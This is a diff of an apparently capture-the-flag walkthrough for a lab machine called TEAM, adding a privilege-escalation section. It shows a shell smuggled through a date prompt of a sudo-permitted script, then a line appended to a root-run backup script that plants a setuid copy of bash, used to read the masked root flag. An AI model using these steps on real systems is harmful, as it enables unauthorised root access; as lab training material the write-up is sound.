@@ -110,7 +110,30 @@ User dale may run the following commands on TEAM:
 ```
 
 ```
-```
-🚩
+dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: data
+Enter 'date' to timestamp the file: /bin/sh -i
+The Date is id
+uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
 
-### Another Path
+gyles@TEAM:/opt/admin_stuff$ find / -group admin 2>/dev/null
+/usr/local/bin
+/usr/local/bin/main_backup.sh
+/opt/admin_stuff
+
+gyles@TEAM:~$ echo "cp -p /bin/bash /tmp/sh && chmod u+s /tmp/sh" >> /usr/local/bin/main_backup.sh
+
+gyles@TEAM:~$ ls -la /tmp/sh
+-rwsr-xr-x 1 root root 1113504 Oct  8 07:46 /tmp/sh
+
+gyles@TEAM:/tmp/sh -p
+
+sh-4.4# cat /root/root.txt
+sh-4.4# THM{f************}
+```
+
+㊗️ はらへった　🥓🥓🥓🥓
+
+
